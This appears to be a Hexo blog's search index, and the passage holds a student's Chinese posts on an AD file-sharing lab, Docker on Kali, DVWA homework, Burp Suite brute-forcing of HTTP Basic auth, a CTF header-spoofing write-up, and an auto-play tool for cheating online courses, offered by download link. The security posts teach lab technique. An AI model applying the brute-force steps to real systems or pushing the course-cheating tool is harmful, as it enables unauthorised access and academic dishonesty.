<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>创建公司文件共享体系方案</title>
    <url>/2022/10/28/fx1/</url>
    <content><![CDATA[<h3 id="项目设计要求"><a href="#项目设计要求" class="headerlink" title="项目设计要求"></a>项目设计要求</h3><h4 id="数据可朔源"><a href="#数据可朔源" class="headerlink" title="数据可朔源"></a>数据可朔源</h4><ul>
<li>服务器配置卷影副本和Server backup，计划每日00：00自动备份，可以达到随时恢复相应版本的文件夹以及单个文件的数据。</li>
</ul>
<h4 id="数据可漫游"><a href="#数据可漫游" class="headerlink" title="数据可漫游"></a>数据可漫游</h4><ul>
<li>使用者切换电脑后，账户内设置和文件数据不会改变，将会存储到服务器内。更换新电脑加入域后，可以直接恢复到新电脑内，不需要进行人工拷贝或者重新设置。</li>
</ul>
<h4 id="数据可修复"><a href="#数据可修复" class="headerlink" title="数据可修复"></a>数据可修复</h4><ul>
<li>服务器存储做在了Raid-5的磁盘卷上，如果硬盘有损坏，数据不会丢失，可重新插入新的硬盘，进行修复即可。保障了服务器数据的安全性。</li>
</ul>
<h4 id="账户管理方便"><a href="#账户管理方便" class="headerlink" title="账户管理方便"></a>账户管理方便</h4><ul>
<li>各用户账户的浏览权限不混乱，可随时更改各账户的浏览权限。</li>
</ul>
<h3 id="方案优劣势及解决方案"><a href="#方案优劣势及解决方案" class="headerlink" title="方案优劣势及解决方案"></a>方案优劣势及解决方案</h3><h4 id="优势概述"><a href="#优势概述" class="headerlink" title="优势概述"></a>优势概述</h4><ol>
<li>方便管理，权限管理集中，管理员可更好进行计算机资源的管理</li>
<li>安全性高，利于企业的保密资料管理，可让指定的人看，但不可删改移</li>
<li>方便对用户操作进行权限设置，可以分发，指派软件，实现计算机统一安装</li>
<li>使用漫游账户和文件夹重定向技术，个人账户的工作文件及数据可以存放在服务器内，统一进行备份、管理、恢复</li>
</ol>
<h4 id="劣势概述"><a href="#劣势概述" class="headerlink" title="劣势概述"></a>劣势概述</h4><ol>
<li>未进行端口屏蔽</li>
<li>无法批量创建账户或者批量设置权限</li>
</ol>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><ol>
<li>对需要的端口进行开放，禁用其余不必要端口</li>
<li>使用ADManager Plus，它可以通过.cvs文件对相应数据进行上传，还可以通过自定义模板对账户进行批量上传，极大的解决了AD域用户批量管理的问题。</li>
</ol>
<h3 id="项目实施步骤"><a href="#项目实施步骤" class="headerlink" title="项目实施步骤"></a>项目实施步骤</h3><h4 id="新建域“jinxiangyuan-com”"><a href="#新建域“jinxiangyuan-com”" class="headerlink" title="新建域“jinxiangyuan.com”"></a>新建域“jinxiangyuan.com”</h4><p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/3047133561.png" alt="1.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><br>####	在域内新建单位组织<br><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/2621091782.png" alt="2.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><br>####	在虚拟机上新建4块2G硬盘，作为服务器存储<br><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/2618820423.png" alt="3.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><br><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/1363494238.png" alt="4.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><br><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/4216021674.png" alt="5.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<h4 id="在服务器存储中创建文件夹"><a href="#在服务器存储中创建文件夹" class="headerlink" title="在服务器存储中创建文件夹"></a>在服务器存储中创建文件夹</h4><p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/3373330913.png" alt="6.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><br>####	给各个用户分配权限<br><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/807924369.png" alt="7.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><br><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/1893755760.png" alt="8.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<h4 id="配置漫游用户文件"><a href="#配置漫游用户文件" class="headerlink" title="配置漫游用户文件"></a>配置漫游用户文件</h4><p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/904888668.png" alt="1111.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><br>####	添加服务器备份功能，按照计划进行备份<br><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/3207672060.png" alt="9.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><br>####	添加卷影副本<br><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/2137157129.png" alt="10.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<h3 id="测试环节"><a href="#测试环节" class="headerlink" title="测试环节"></a>测试环节</h3><h4 id="数据都要有相应的版本可以随时朔源"><a href="#数据都要有相应的版本可以随时朔源" class="headerlink" title="数据都要有相应的版本可以随时朔源"></a>数据都要有相应的版本可以随时朔源</h4><ul>
<li>对文件进行更改</li>
</ul>
<p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/458965202.png" alt="11.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<ul>
<li>选择文件进行回退</li>
</ul>
<p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/775932064.png" alt="12.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<ul>
<li>成功恢复到之前备份的</li>
</ul>
<p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/671438867.png" alt="13.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<ul>
<li>检查内容是否更改</li>
</ul>
<p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/2638011957.png" alt="14.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<h4 id="服务器数据得到稳妥的安全保障"><a href="#服务器数据得到稳妥的安全保障" class="headerlink" title="服务器数据得到稳妥的安全保障"></a>服务器数据得到稳妥的安全保障</h4><ul>
<li>随意新建文件</li>
</ul>
<p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/1154836450.png" alt="15.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<ul>
<li>随机删除一块硬盘</li>
</ul>
<p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/529261097.png" alt="16.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<ul>
<li>文件内容没有丢失</li>
</ul>
<p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/340342206.png" alt="17.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<ul>
<li>重新插入一个硬盘，修复服务器</li>
</ul>
<p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/1684269482.png" alt="18.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<h4 id="用户更换电脑无需拷贝数据"><a href="#用户更换电脑无需拷贝数据" class="headerlink" title="用户更换电脑无需拷贝数据"></a>用户更换电脑无需拷贝数据</h4><ul>
<li>在Win2008-3主机上登录创建文件改变配色</li>
</ul>
<p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/2831445869.png" alt="copy.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<ul>
<li>在Win2008-2主机上登录，刚刚创建的文件和配色都漫游了</li>
</ul>
<p><img src="https://yuan.thankyy.cn/usr/uploads/2022/10/3534902107.png" alt="copy2.png" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
]]></content>
      <categories>
        <category>在校作业</category>
      </categories>
      <tags>
        <tag>资源分享</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali环境中安装Docker的详细步骤</title>
    <url>/2023/03/16/2023-03-16-dockerdownload/</url>
    <content><![CDATA[<h1 id="以下是在Kali环境中安装Docker的详细步骤："><a href="#以下是在Kali环境中安装Docker的详细步骤：" class="headerlink" title="以下是在Kali环境中安装Docker的详细步骤："></a>以下是在Kali环境中安装Docker的详细步骤：</h1><h2 id="1-修改源"><a href="#1-修改源" class="headerlink" title="1. 修改源"></a>1. 修改源</h2><p>打开终端，输入以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>找到文件中的所有原始并将其替换为中科大的源，请将以下两行添加到文件的末尾：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<p>按CTRL+X，然后按Y保存更改。</p>
<h2 id="2-安装Docker"><a href="#2-安装Docker" class="headerlink" title="2. 安装Docker"></a>2. 安装Docker</h2><p>在终端中运行以下命令来安装Docker：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>

<h2 id="3-检查是否安装完成"><a href="#3-检查是否安装完成" class="headerlink" title="3. 检查是否安装完成"></a>3. 检查是否安装完成</h2><p>运行以下命令检查Docker是否正确安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker --version</span><br></pre></td></tr></table></figure>

<p>如果一切正常，您应该看到Docker的版本信息。</p>
<h2 id="4-Docker源加速"><a href="#4-Docker源加速" class="headerlink" title="4. Docker源加速"></a>4. Docker源加速</h2><p>为了加快Docker镜像的下载速度，我们可以使用一个国内镜像站点。创建文件&#x2F;etc&#x2F;docker&#x2F;daemon.json：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<p>写入以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn/&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按CTRL+ X，然后按Y保存更改。</p>
<p>重启Docker以使更改生效：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h2 id="5-准备容器镜像"><a href="#5-准备容器镜像" class="headerlink" title="5. 准备容器镜像"></a>5. 准备容器镜像</h2><p>在教程过程中会用到多个容器镜像，因此需要提前下载这些镜像。</p>
<h3 id="5-1-漏洞环境"><a href="#5-1-漏洞环境" class="headerlink" title="5.1 漏洞环境"></a>5.1 漏洞环境</h3><p>运行以下命令来获取漏洞环境的Docker镜像：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker pull area39/pikachu:latest</span><br></pre></td></tr></table></figure>

<h3 id="5-2-AWVS扫描器"><a href="#5-2-AWVS扫描器" class="headerlink" title="5.2 AWVS扫描器"></a>5.2 AWVS扫描器</h3><p>运行以下命令来获取AWVS扫描器的Docker镜像：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker pull secfa/docker-awvs</span><br></pre></td></tr></table></figure>

<h3 id="5-3-Nessus扫描器"><a href="#5-3-Nessus扫描器" class="headerlink" title="5.3 Nessus扫描器"></a>5.3 Nessus扫描器</h3><p>运行以下命令来获取Nessus扫描器的Docker镜像：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker pull registry.cn-hangzhou.aliyuncs.com/steinven/nessus:v0.1</span><br></pre></td></tr></table></figure>

<h3 id="5-4-启动需要的项目"><a href="#5-4-启动需要的项目" class="headerlink" title="5.4 启动需要的项目"></a>5.4 启动需要的项目</h3><p>TIP：第三个目前不需要启动，上午的课题只需要启动前两个即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启动pikachu</span><br><span class="line">sudo docker run -dit -p 80:80 area39/pikachu:latest</span><br><span class="line"># 启动AWVS扫描器</span><br><span class="line">sudo docker run -dit -p 3443:3443 secfa/docker-awvs</span><br><span class="line"># Nessus扫描器</span><br><span class="line">sudo docker run -rm -p 8834:8834 registry.cn-hangzhou.aliyuncs.com/steinven/nessus:v0.1 &amp;</span><br></pre></td></tr></table></figure>

<p>现在您已经成功地在Kali环境中安装了Docker，并准备好使用所需的容器镜像。</p>
]]></content>
      <tags>
        <tag>Web课程笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>在浙学无人值守刷课</title>
    <url>/2022/11/25/fx2/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>各大课程平台更新较快，脚本有时效性。<br>脚本失效请在留言区回复。<br>请耐心看完整篇教程</p>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ol>
<li>在浙学刷课APP</li>
<li>一个会转动的脑子</li>
</ol>
<h4 id="浙学刷课APP-使用方法"><a href="#浙学刷课APP-使用方法" class="headerlink" title="浙学刷课APP 使用方法"></a>浙学刷课APP 使用方法</h4><ol>
<li><p>登录账号<br> 账号一般为 tzvcst_(学号)</p>
</li>
<li><p>在课程列表中选择课程</p>
</li>
</ol>
<p>  <img src="https://yuan.thankyy.cn/usr/uploads/2022/03/2069754413.png" alt="Test" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<ol start="3">
<li>切换至课程详情页<br>按照提示切换页面，将显示课程数据</li>
</ol>
<p>  <img src="https://yuan.thankyy.cn/usr/uploads/2022/03/948064861.jpg" alt="Test" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<ol start="4">
<li>点击开始刷课按钮<br>点击按钮自动刷课，目前支持文档及视频学习</li>
</ol>
<p>  <img src="https://yuan.thankyy.cn/usr/uploads/2022/03/1708673269.jpg" alt="Test" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<ol start="5">
<li>刷完后，刷新数据<br>左滑课程列表中再次点击当前课程，再重新返回课程详情页查看</li>
</ol>
<p>  <img src="https://yuan.thankyy.cn/usr/uploads/2022/03/1399334542.jpg" alt="Test" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'> </p>
<h4 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h4><p><a href="https://wwp.lanzoup.com/iLMTO0atulub">Go！</a> 密码: 2961</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>如有不懂，请在留言区留言</p>
]]></content>
      <categories>
        <category>大学生刷课</category>
      </categories>
      <tags>
        <tag>资源分享</tag>
      </tags>
  </entry>
  <entry>
    <title>如何获取微信推文封面图？</title>
    <url>/2022/11/25/fx3/</url>
    <content><![CDATA[<h4 id="用浏览器打开公众号的链接"><a href="#用浏览器打开公众号的链接" class="headerlink" title="用浏览器打开公众号的链接"></a>用浏览器打开公众号的链接</h4><p>如果是用手机打开，可以右上角点开之后，找到 “复制链接”，拿到公众号的链接；<br>如果是用微信客户端（PC端）打开，就直接点开，然后左上角有个复制链接的按钮，点击一下复制即可。</p>
<h4 id="在网页源代码中找到图片地址"><a href="#在网页源代码中找到图片地址" class="headerlink" title="在网页源代码中找到图片地址"></a>在网页源代码中找到图片地址</h4><p>用浏览器打开推文后，按F12查看源代码（打开“检查”的开发者工具也行）。</p>
<p>然后停留在源代码的界面，按 “Ctrl+F” 打开搜索框，搜索 “var msg_cdn”，然后将这个属性的值选中右键打开就能跳转到图片所在的网页，右键复制或者另存为即可获得该图片。</p>
<p>然后下面会看到有个 “var cdn_url_1_1” 也有个链接，这也是封面图，这个是按照 1:1 显示的图片。</p>
]]></content>
      <categories>
        <category>好用分享</category>
      </categories>
      <tags>
        <tag>资源分享</tag>
      </tags>
  </entry>
  <entry>
    <title>图片转Excel表格在线工具</title>
    <url>/2022/11/25/fx4/</url>
    <content><![CDATA[<h2 id="白描网页版"><a href="#白描网页版" class="headerlink" title="白描网页版"></a>白描网页版</h2><p>入口 ：<a href="https://web.baimiaoapp.com/image-to-excel">https://web.baimiaoapp.com/image-to-excel</a></p>
<p>白描支持图片转文字、电子表格识别、PDF转文字功能。<br>直接将需要识别的表格图片上传，开始识别，识别完成后，可导出下载XLSX文件。</p>
<hr>
<h2 id="诚华OCR网页版"><a href="#诚华OCR网页版" class="headerlink" title="诚华OCR网页版"></a>诚华OCR网页版</h2><p>入口 ：<a href="https://zhcn.109876543210.com/">https://zhcn.109876543210.com</a></p>
<p>专业的OCR在线工具，支持几十种常用文件格式，有付费和免费转换，免费转换每日可转10页，文件大小不超过10MB，无需注册和登录，先上传需要转换的表格图片，然后选择「输出格式」，点击「免费转换」即可开始，足够我们日常办公用了。</p>
<hr>
<h2 id="QQ截图识别表格"><a href="#QQ截图识别表格" class="headerlink" title="QQ截图识别表格"></a>QQ截图识别表格</h2><p>QQ截图也能够帮我们把图片转Excel表格，打开表格图片，然后使用QQ截图快捷键「Ctrl + Alt + A」，截取表格中图片，然后点击「屏幕识别」-「转为在线文档」，在在线文档中将表格复制，然后粘贴到我们本地的Excel表格中就OK了。</p>
]]></content>
      <categories>
        <category>好用分享</category>
      </categories>
      <tags>
        <tag>资源分享</tag>
      </tags>
  </entry>
  <entry>
    <title>课程作业例题</title>
    <url>/2023/03/07/test-web1/</url>
    <content><![CDATA[<h2 id="一、课堂作业（80分）"><a href="#一、课堂作业（80分）" class="headerlink" title="一、课堂作业（80分）"></a>一、课堂作业（80分）</h2><h3 id="作业一-DVWA-CSRF-Low-漏洞利用【20分】"><a href="#作业一-DVWA-CSRF-Low-漏洞利用【20分】" class="headerlink" title="作业一 DVWA CSRF Low 漏洞利用【20分】"></a>作业一 DVWA CSRF Low 漏洞利用【20分】</h3><p>完成DVWA CSRF Low 漏洞利用，描述关键文字及截图证明过程及结果。</p>
<h3 id="作业二-DVWA-XSS-Reflected-Low-漏洞利用【10分】"><a href="#作业二-DVWA-XSS-Reflected-Low-漏洞利用【10分】" class="headerlink" title="作业二 DVWA XSS(Reflected) Low 漏洞利用【10分】"></a>作业二 DVWA XSS(Reflected) Low 漏洞利用【10分】</h3><p>完成DVWA XSS(Reflected) Low 漏洞利用，描述关键文字及截图证明过程及结果。</p>
<h3 id="作业三-DVWA-XSS-Reflected-Medium漏洞利用【20分】"><a href="#作业三-DVWA-XSS-Reflected-Medium漏洞利用【20分】" class="headerlink" title="作业三 DVWA XSS(Reflected) Medium漏洞利用【20分】"></a>作业三 DVWA XSS(Reflected) Medium漏洞利用【20分】</h3><p>完成DVWA XSS(Reflected) Medium漏洞利用，描述关键文字及截图证明过程及结果。</p>
<h3 id="作业四-DVWA-XSS-Stored-Low-漏洞利用【10分】"><a href="#作业四-DVWA-XSS-Stored-Low-漏洞利用【10分】" class="headerlink" title="作业四 DVWA XSS(Stored) Low 漏洞利用【10分】"></a>作业四 DVWA XSS(Stored) Low 漏洞利用【10分】</h3><p>完成DVWA XSS(Stored) Low 漏洞利用，描述关键文字及截图证明过程及结果。</p>
<h3 id="作业五-DVWA-XSS-Stored-Medium漏洞利用【20分】"><a href="#作业五-DVWA-XSS-Stored-Medium漏洞利用【20分】" class="headerlink" title="作业五 DVWA XSS(Stored) Medium漏洞利用【20分】"></a>作业五 DVWA XSS(Stored) Medium漏洞利用【20分】</h3><p>完成DVWA XSS(Stored) Medium漏洞利用，描述关键文字及截图证明过程及结果。</p>
<h2 id="二、综合性作业（20分）"><a href="#二、综合性作业（20分）" class="headerlink" title="二、综合性作业（20分）"></a>二、综合性作业（20分）</h2><p>在 <a href="https://cloud.dasctf.com/compete/524/detail">https://cloud.dasctf.com/compete/524/detail</a> 里进入当日作业，使用个人账号密码进行登录。账号为个人中文姓名，密码为 Das#学号。完成题目并提交 flag，如无特殊说明，只提交 flag{xxx} 或DASCTF{xxx} 中 {} 包裹的字符串，即 xxx。描述关键文字及截图证明过程及结果。（有兴趣的同学可以尝试写一个简单的 python 脚本进行爆破）</p>
]]></content>
      <tags>
        <tag>课程作业例题</tag>
      </tags>
  </entry>
  <entry>
    <title>文章标题函数</title>
    <url>/2023/03/17/testposts/</url>
    <content><![CDATA[<p>keywords：关键字，用于 meta 标签<br>description：描述，用于 meta 标签<br>cover：文章封面图，可为字符串或数组，如果数组长度为 2 则会根据主题自动切换。<br>sticky：首页排序值<br>banner：文章页横幅背景，字段参考 横幅 banner.default 字段。<br>toc：是否显示目录，仅当值为 false 生效。默认通过 _config.async.yaml 的 is_toc 控制。<br>single_column：单栏显示详情页，为 true 时生效。<br>author：文章作者<br>originalLink：文章源链接（用于转载）<br>内置的置顶脚本已删除，将 hexo-generator-index 升级到 2.0.0+ 以上版本即可。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">从零开始搭建一个后台模板</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="string">admin-template,vue,element,后台模板</span></span><br><span class="line"><span class="attr">cover:</span> [<span class="string">https://www.logosc.cn/uploads/resources/2018/11/29/1543459457_thumb.jpg</span>]</span><br><span class="line"><span class="attr">sticky:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">banner:</span> </span><br><span class="line">  <span class="attr">type:</span> <span class="string">img</span></span><br><span class="line">  <span class="attr">bgurl:</span> <span class="string">https://pic1.zhimg.com/v2-b3c2c6745b9421a13a3c4706b19223b3_r.jpg</span></span><br><span class="line">  <span class="attr">bannerText:</span> <span class="string">Hi</span> <span class="string">my</span> <span class="string">new</span> <span class="string">friend!</span></span><br><span class="line"><span class="attr">toc:</span> <span class="literal">false</span> <span class="comment"># 无需显示目录</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>文章</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在同一台电脑上使用Python 2.7和Python 3.7</title>
    <url>/2023/03/06/web/</url>
    <content><![CDATA[<h2 id="如何在同一台电脑上使用Python-2-7和Python-3-7"><a href="#如何在同一台电脑上使用Python-2-7和Python-3-7" class="headerlink" title="如何在同一台电脑上使用Python 2.7和Python 3.7"></a>如何在同一台电脑上使用Python 2.7和Python 3.7</h2><p>在同一台电脑上使用<code>Python 2.7</code>和<code>Python 3.7</code>是很常见的需求。但是，在安装和配置Python环境时，需要注意一些问题，以确保两个版本的Python能够正常运行。</p>
<p>确认Python环境变量设置正确<br>在设置Python环境变量时，应该将Python 2.7和Python 3.7的路径分别添加到环境变量中，并将<code>Python 2.7\Scripts</code>和<code>Python 3.7\Scripts</code>的路径分别添加到环境变量中，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Python27;C:\Python27\Scripts;C:\Python37;C:\Python37\Scripts</span><br></pre></td></tr></table></figure>

<p>这样可以保证在CMD中使用<code>Python 2.7</code>和<code>Python 3.7</code>时，能够正确地找到Python解释器和pip命令。</p>
<p>修改<code>Python 3.7</code>的可执行文件名<br>为了方便在CMD中使用<code>Python 3.7</code>，可以将<code>Python 3.7</code>的可执行文件名修改为<code>“python3.exe”</code>，并将其添加到环境变量中。这样，在CMD中输入<code>“python3”</code>命令即可启动Python 3.7解释器。</p>
<p>示例代码<br>以下是一个示例代码，演示如何在CMD中使用<code>Python 2.7</code>和<code>Python 3.7</code>：</p>
<h2 id="使用Python-2-7"><a href="#使用Python-2-7" class="headerlink" title="使用Python 2.7"></a>使用Python 2.7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; python</span><br></pre></td></tr></table></figure>

<h2 id="使用Python-3-7"><a href="#使用Python-3-7" class="headerlink" title="使用Python 3.7"></a>使用Python 3.7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; python3</span><br></pre></td></tr></table></figure>

<h2 id="安装requests库"><a href="#安装requests库" class="headerlink" title="安装requests库"></a>安装requests库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; pip install requests</span><br></pre></td></tr></table></figure>

<h2 id="在Python代码中导入requests库"><a href="#在Python代码中导入requests库" class="headerlink" title="在Python代码中导入requests库"></a>在Python代码中导入requests库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总之，在安装和配置Python环境时，需要仔细检查环境变量的设置，确保Python解释器和pip命令能够正确地运行。</p>
]]></content>
      <categories>
        <category>课程笔记</category>
      </categories>
      <tags>
        <tag>Web课程笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP基本认证</title>
    <url>/2023/03/07/web3/</url>
    <content><![CDATA[<h2 id="步骤一：抓取靶机的包"><a href="#步骤一：抓取靶机的包" class="headerlink" title="步骤一：抓取靶机的包"></a>步骤一：抓取靶机的包</h2><p>在输入过密码的前提下，使用Burp Suite抓取靶机的包，以便进行后续的密码爆破测试。</p>
<h2 id="步骤二：找到正确的包后，发送给测试器进行密码爆破"><a href="#步骤二：找到正确的包后，发送给测试器进行密码爆破" class="headerlink" title="步骤二：找到正确的包后，发送给测试器进行密码爆破"></a>步骤二：找到正确的包后，发送给测试器进行密码爆破</h2><p>在找到正确的包后，将其发送给密码爆破测试器，进行后续的测试。</p>
<h2 id="步骤三：在测试器中添加§前缀"><a href="#步骤三：在测试器中添加§前缀" class="headerlink" title="步骤三：在测试器中添加§前缀"></a>步骤三：在测试器中添加§前缀</h2><p>在测试器中，选取<code>Authorization: Basic YWRtaW46MTIzNA==</code>字段，并选中<code>YWRtaW46MTIzNA==</code>，然后点击右侧的<code>添加§</code>按钮，使其变成<code>Authorization: Basic §YWRtaW46MTIzNA==§</code>的格式。这样做是为了告诉程序需要对这个位置进行密码爆破测试，以便找到正确的密码。</p>
<h2 id="步骤四：解码验证"><a href="#步骤四：解码验证" class="headerlink" title="步骤四：解码验证"></a>步骤四：解码验证</h2><p>由于<code>YWRtaW46MTIzNA==</code>使用<code>Basic</code>进行解码后得到<code>admin:1234</code>，从而得知密码格式是<code>user:password</code>。</p>
<h2 id="步骤五：在有效载荷中添加前缀admin"><a href="#步骤五：在有效载荷中添加前缀admin" class="headerlink" title="步骤五：在有效载荷中添加前缀admin:"></a>步骤五：在有效载荷中添加前缀admin:</h2><p>为了进行密码爆破，需要在有效载荷中添加前缀<code>admin:</code>，以便对密码进行猜测。</p>
<h2 id="步骤六：对前缀admin-进行Base64编码处理"><a href="#步骤六：对前缀admin-进行Base64编码处理" class="headerlink" title="步骤六：对前缀admin:进行Base64编码处理"></a>步骤六：对前缀admin:进行Base64编码处理</h2><p>在有效载荷处理中，选中前缀<code>admin:</code>，然后选择Base64编码处理，进行编码操作。</p>
<h2 id="步骤七：取消特殊字符编码"><a href="#步骤七：取消特殊字符编码" class="headerlink" title="步骤七：取消特殊字符编码"></a>步骤七：取消特殊字符编码</h2><p>由于&#x3D;&#x3D;是不被编码的，所以需要取消特殊字符的编码。</p>
<h2 id="步骤八：进行密码爆破"><a href="#步骤八：进行密码爆破" class="headerlink" title="步骤八：进行密码爆破"></a>步骤八：进行密码爆破</h2><p>最后，进行密码爆破测试，即可获得正确的密码。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在整个过程中，我们使用了Burp Suite进行包拦截和测试，使用了Base64编码和解码函数对字符串进行处理，以及使用了密码爆破测试器对密码进行猜测。这些步骤都是非常重要的，需要仔细地进行操作，以便得到准确的测试结果。</p>
]]></content>
      <categories>
        <category>课程笔记</category>
      </categories>
      <tags>
        <tag>Web课程笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019 Http 1</title>
    <url>/2023/03/06/web2/</url>
    <content><![CDATA[<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><ol>
<li><p>查看源代码<br>首先，需要查看目标网站的源代码，以便了解网站的结构和可能存在的漏洞。在本例中，我们发现了一个名为<code>secret.php</code>的文件。</p>
</li>
<li><p>使用Burp抓包<br>使用Burp抓包，获取请求信息。在此过程中，我们可以了解到请求头、请求体等信息。</p>
</li>
<li><p>发送请求到重发器<br>将请求信息发送到重发器中，以便对其进行修改和重放。</p>
</li>
<li><p>在请求头中添加Referer<br>在Host下添加Referer字段，告诉服务器请求来源。在本例中，我们需要添加：</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br></pre></td></tr></table></figure>


<ol start="5">
<li>在User-Agent中添加浏览器信息<br>服务器可能会根据User-Agent字段判断请求的来源。在本例中，我们需要使用Syclover浏览器，所以需要在User-Agent中添加浏览器信息。具体来说，我们需要在User-Agent字段的末尾添加Syclover。完整的User-Agent字段如下：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63 Syclover</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>在头部添加X-Forwarded-For<br>为了让服务器认为请求来自本地，我们需要在头部添加X-Forwarded-For字段，并将其设置为localhost。具体来说，我们需要添加如下字段：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: localhost</span><br></pre></td></tr></table></figure>

<ol start="7">
<li><p>重放请求<br>点击重发按钮，将修改后的请求发送到服务器。</p>
</li>
